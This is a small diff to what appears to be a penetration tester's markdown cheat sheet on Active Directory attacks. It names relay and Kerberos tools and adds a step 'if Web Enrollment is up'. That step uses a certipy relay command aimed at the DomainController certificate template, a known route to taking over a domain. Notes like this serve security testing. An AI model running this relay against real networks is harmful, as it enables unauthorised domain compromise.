@@ -2,6 +2,8 @@
 
 ## Tools: ntlmrelayx , Rubeus , certipy , gettgtpkinit.py
 
+### If Web Enrollment is up, we do:
+
 #### 1) Certipy
 
  - certipy relay -ca CA_IP -template DomainController
